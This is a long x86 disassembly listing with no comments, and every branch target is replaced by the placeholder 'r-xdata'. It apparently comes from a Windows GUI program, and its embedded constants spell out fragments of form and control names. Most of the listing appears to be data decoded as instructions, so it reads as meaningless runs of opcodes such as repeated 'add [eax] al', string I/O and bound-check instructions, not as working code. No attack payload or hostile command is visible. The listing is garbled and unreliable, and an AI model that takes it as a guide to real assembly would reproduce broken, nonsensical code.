adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
jb r-xdata
and al [ esi ]
or al 0x2
add bh bh
mov eax 0x100465c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ edx ] bl
inc esi
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
adc [ edx ] eax
cmp [ esi ] cl
jae r-xdata
jb r-xdata
daa
inc esi
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc esp
add [ eax ] dl
inc eax
add [ eax ] ch
xor [ eax ] eax
pop edx
inc esi
inc esi
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ ecx ] bl
inc esi
add al dh
pop edx
inc esi
add [ edx + edx + 0x627c0045 ] bh
inc eax
add [ eax + 0x7004628 ] cl
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
add [ eax + 0x28 ] ch
inc esi
add [ esi + 0x28 ] dh
inc esi
add [ edx + eax ] ah
add [ eax ] al
loopne r-xdata
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
inc esi
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
add eax 0xb8000000
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ edi + 0x46 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ eax ] ch
inc esi
add [ eax ] al
add [ eax ] al
str [ edx ]
inc ecx
jne r-xdata
insb
cwde
outsd
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
adc al [ ebp ]
jl r-xdata
daa
inc esi
add [ esi ] bh
inc esi
add [ eax + eax + 0x5 ] al
inc esi
outsd
jb r-xdata
add [ eax + 0x42080016 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2065646f
daa
inc esi
add [ eax ] ah
add al [ eax ]
dec esp
bound eax [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
insb
dec edi
jne r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
je r-xdata
insb
inc edx
outsd
js r-xdata
inc esi
add [ edi + ecx + 0x5ab00045 ] ah
inc esi
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
mov eax 0x30004511
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ eax ] dl
pop ebx
inc esi
add al al
pop ebp
inc esi
add ah dh
pop edi
inc esi
add [ edx ] al
add [ eax + eax + 0x62e0b010 ] al
inc esi
add al ch
bound eax [ esi ]
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
add [ eax + eax ] bl
[ eax + eax ]
jae r-xdata
hlt
jb r-xdata
add bh bh
int3
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
push cs
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add al dl
add [ eax + eax + 0x5b ] 0x0
add bh bh
dec eax

add bh bh
jpe r-xdata
je r-xdata
add [ edx ] cl
inc edx
jbe r-xdata
xchg edi eax
inc esp
add [ ebp + 0x1 ] ah
add bh bh
movsb [ edi ] [ esi ]
dec ebx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + 0x65 ] eax
jbe r-xdata
add [ eax ] al
add [ eax + eax ] dl
insb
inc ebp
jae r-xdata
add bh bh
xor [ ebx + 0x45 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] dl
inc eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
inc [ ecx ]
insb
lodsb [ gs : esi ]
mov [ eax + eax + 0x74 ] al
add [ eax ] al
dec [ eax ]
sti
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
pop eax
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0xc4ff0001
dec ebx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add bh bh
insb
pop esp
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
xchg esi eax
inc esp
add [ ebx + 0x1 ] ah
add [ eax ] al
adc eax 0x65420a00
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
call esp
xlat
jae r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ ecx + 0x75 ] al
je r-xdata
add bh bh
pop esp
add [ eax ] al
xchg esi eax
inc esp
add [ ecx + eax ] ah
push [ eax ]
dec ebx
inc ebp
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ edi + edi + 0x45 ]
add [ eax + 0x453f ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001f ] al
je r-xdata
inc esp
add al dh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001e ] al
outsd
insb
outsd
add bh bh
aam 0xd7
jb r-xdata
add [ eax ] al
add [ ebx ] bl
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax - 0x700ffff ] ch
sub [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] eax
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
mov eax 0x7a004480
add [ eax ] al
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
xor eax [ esp + 0x24 ]
inc edx
add [ eax ] ch
add bh bh
sub bh dl
inc esp
add [ eax ] bh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
add al 0x20
inc edx
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
xchg [ eax + eax - 0x65 ] eax
add [ eax ] al
[ ebx + 0x1ff0000 ]
jb r-xdata
sbb [ esi ] 0x0
add eax 0x6f6c6f43
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
je r-xdata
jne r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
clc
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
push esp
aad 0x44
jo r-xdata
adc [ eax ] al
0xa8ff0000 0x44d7
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : esi ] cl
outsb
je r-xdata
sub [ edi ] 0x0
push cs
jpe r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x40 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
je r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0032 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
js r-xdata
add [ eax ] al
nop
push ebp
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax + 0x44f6 ] dh
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x94656c62
mov es [ eax + eax - 0x40 ]
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call [ ebp + edx * 8 + 0x44 ]
adc [ eax ] al
cdq
add [ eax ] al
inc [ edi + edx * 8 - 0x28b3ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080028 ] al
push 0x6948776f
outsb
je r-xdata
aas
inc ebp
add [ eax ] bh
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
adc [ eax ] al
test eax 0x8cff0001
aas
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
push esp
push eax
outsd
jo r-xdata
outsb
xchg [ eax + eax - 0x48 ] eax
push eax
popad
jo r-xdata
mov [ ebp ] 0xff00007c
in al dx
aad 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090027 ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
inc eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul ebp [ esi + 0x74 ] r-xdata
mov eax 0x3800453f
outsd
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ ecx ] cl
push eax
outsb
je r-xdata
inc edi
je r-xdata
nop
push ebp
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070037 ] al
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x4 ] bp
mov eax [ eax + eax + 0x18 ]
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
mov eax [ eax + eax - 0x18 ]
add [ eax ] al
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
push 0xe0004489
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0x686f666e
mov [ eax + eax - 0x30 ] eax
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003a ] al
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
add bh bh
shl dh 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002d ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
push ebp
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
pushad
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500a00
insb
sbb al 0x90
inc esp
outsd
ja r-xdata
dec edi
push ebp
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
js r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
push ebx
je r-xdata
push edi
loopne r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
jo r-xdata
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ esi ] cl
outsd
outsd
imul esi [ eax + 0x68 ] 0x41
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
jb r-xdata
inc esp
outsd
arpl [ ebx - 0x4c ] bp
mov eax [ eax + eax + 0x10 ]
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
outsb
push ebx
je r-xdata
sbb al 0x90
inc esp
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e003f ] al
outsb
dec ebp
outsd
jne r-xdata
inc esp
add al bl
add [ eax ] al
jbe r-xdata
mov eax [ eax + eax + 0x8 ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0039 ] al
outsb
mov es [ eax + eax - 0x30 ]
add [ eax ] eax
call eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0030 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
mov al 0x1
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
mov [ eax + eax - 0x48 ] es
add [ eax ] eax
invd
dec ecx
insb
inc esi
add bh bh
dec [ ebx + 0x4630c4c0 ]
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
add [ edi ] cl
or [ ecx + 0x4f ] cl
inc esi
jb r-xdata
inc esp
jb r-xdata
push edi
push 0x556c6565
jo r-xdata
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
insd
dec esp
adc [ eax ] eax
add ecx eax
loope r-xdata
ficom [ edx - 0x30 ]
adc [ esi - 0x50dfff5a ] ebx
dec edi
push eax
lea eax [ eax + eax - 0x10 ]
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0c00
dec ebp
outsd
jne r-xdata
push ebp
inc ecx
add al bh
add [ eax ] al
outsd
jb r-xdata
inc eax
add [ ecx + esi + 0x46 ] al
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
cmp eax 0x4605da82
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
int 0xda
add [ ebx ] al
add [ eax ] al
add [ eax + 0x31 ] al
inc esi
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
dec ebp
jae r-xdata
add [ eax ] eax
outsb
jb r-xdata
add [ eax ] cl
dec edi
outsb
push edx
jae r-xdata
inc esp
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10003e ] al
outsb
push edi
push 0x1c6c6565
nop
push eax
outsd
jae r-xdata
jb r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp + 0x30f40040 ]
inc esi
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
add bh bh
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
outsd
jb r-xdata
inc esi
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rcl [ eax + 0xf004630 ] 0xd
dec ecx
inc esp
jae r-xdata
dec edi
jpe r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
dec edi
insb
jo r-xdata
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
mov eax eax
xchg esp eax
xor [ esi ] eax
push es
inc esi
outsd
jb r-xdata
popad
js r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
add [ eax ] cl
mov esp 0x448d
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0041 ] al
outsb
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + 0xa004631 ] ch
jo r-xdata
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
push cs
jo r-xdata
bound ebp [ ecx + 0x4d ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al dh
xor [ esi ] al
or [ esi + 0x73 ] ah
dec esi
outsd
jb r-xdata
insb
add [ gs : eax ] eax
insb
jns r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
push es
add eax 0x6d726f46
jae r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
outsd
add [ eax ] al
add eax [ eax ]
add [ eax ] al
inc esp
xor al [ esi ]
or [ ebp + ebp * 2 + 0x44 ] esp
inc esp
popa
jne r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
rcl [ ecx + esi + 0xc060046 ] 0x54
or al 0x54
inc esi
add [ esi ] al
jns r-xdata
xor al [ esi ]
push es
inc eax
add [ ebx + esi ] ch
outsd
xor al [ esi ]
add ecx [ ebx ]
add eax 0x6d726f46
jo r-xdata
jo r-xdata
arpl [ ecx + 0x6c ] sp
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x6004632 ] bl
inc ebx
outsb
je r-xdata
inc esi
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
xor [ esi ] eax
nop
lodsb [ esi ]
inc eax
je r-xdata
je r-xdata
jae r-xdata
add [ eax ] al
add [ edx + esi + 0x46 ] al
add [ ecx ] cl
insd
inc esp
je r-xdata
popad
dec ebp
je r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
inc esi
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
sub al 0x33
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
xor al [ esi ]
push esp
push eax
dec edi
ja r-xdata
jb r-xdata
dec eax
je r-xdata
nop
insd
popad
jb r-xdata
inc esp
jae r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
jb r-xdata
jo r-xdata
jb r-xdata
lea eax [ eax ]
inc esp
xor [ esi ] eax
add ecx [ ebx ]
push esp
inc edx
outsd
inc esi
outsd
jb r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
jae r-xdata
outsb
je r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add al ah
xor al [ esi ]
jo r-xdata
push cs
je r-xdata
jb r-xdata
jb r-xdata
inc esi
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
loopne r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
in al 0x32
inc esi
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
xor [ esi ] eax
add ecx [ ecx ]
push esp
jae r-xdata
jae r-xdata
jo r-xdata
loopne r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] 0x40
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
xchg esp eax
xor al 0x46
inc ebp
jbe r-xdata
add cl [ eax ]
push es
popad
outsb
add [ eax ] al
jb r-xdata
add [ ebx ] al
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
insd
add [ eax ] al
cwde
jae r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] ch
inc eax
add al ah
xor al [ esi ]
lea eax [ eax ]
jo r-xdata
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc esi
add [ esi ] al
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
jb r-xdata
inc ebp
add [ esp + ebp * 2 ] ch
inc esi
add [ eax - 0x75 ] dh
inc ecx
add [ eax + ebp * 2 + 0x46 ] bh
add [ eax - 0x3bffb998 ] bh
imul eax [ esi ] sub_44d41c
push eax
adc [ edx ] eax
cmp al 0x72
inc esi
add [ eax ] dh
push cs
inc edx
add ah bl
lodsd [ esi ]
inc esi
add [ ebx ] dl
inc esi
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
add [ eax ] bh
adc [ edx ] eax
mov al [ 0x54004664 ]
inc esi
pop es
dec ecx
outsb
je r-xdata
mov [ esi ] eax
add [ eax + 0x13540046 ] cl
inc ebp
add [ eax + 0x13 ] bl
inc ebp
add [ edx + ecx * 4 + 0x46 ] bh
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x40044d5 ] dl
jb r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
jo r-xdata
inc ebp
jbe r-xdata
jne r-xdata
popad
je r-xdata
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ eax ] al
adc [ eax ] al
nop
mov ah 0x33
inc esi
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
inc esi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
adc [ eax + 0x6f ] esi
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
inc si
add [ eax - 0x3fffbfcd ] bh
mov al [ esi ]
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
mov esp 0x34004666
dec ecx
push esp
jb r-xdata
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] ch
add [ eax ] al
add [ eax - 0x6f ] dh
inc esi
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi - 0x597bffbb ] ch
inc esi
add [ eax ] dl
pop ebx
inc esi
add al al
pop ebp
inc esi
add [ edi + edx * 4 + 0x46 ] ah
add [ eax + 0x1c004667 ] ah
adc [ ebp ] eax
xor [ esi ] bh
inc ebp
add al dl
jo r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2c004635 ] cl
aaa
inc esi
add [ eax ] al
add [ eax ] al
push esp
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x34940040 ] cl
inc esi
jbe r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
outsb
je r-xdata
outsd
jae r-xdata
outsd
outsd
insb
outsb
je r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
inc ebp
add al cl
salc
inc esp
add [ edx + esi * 2 + 0x46 ] bh
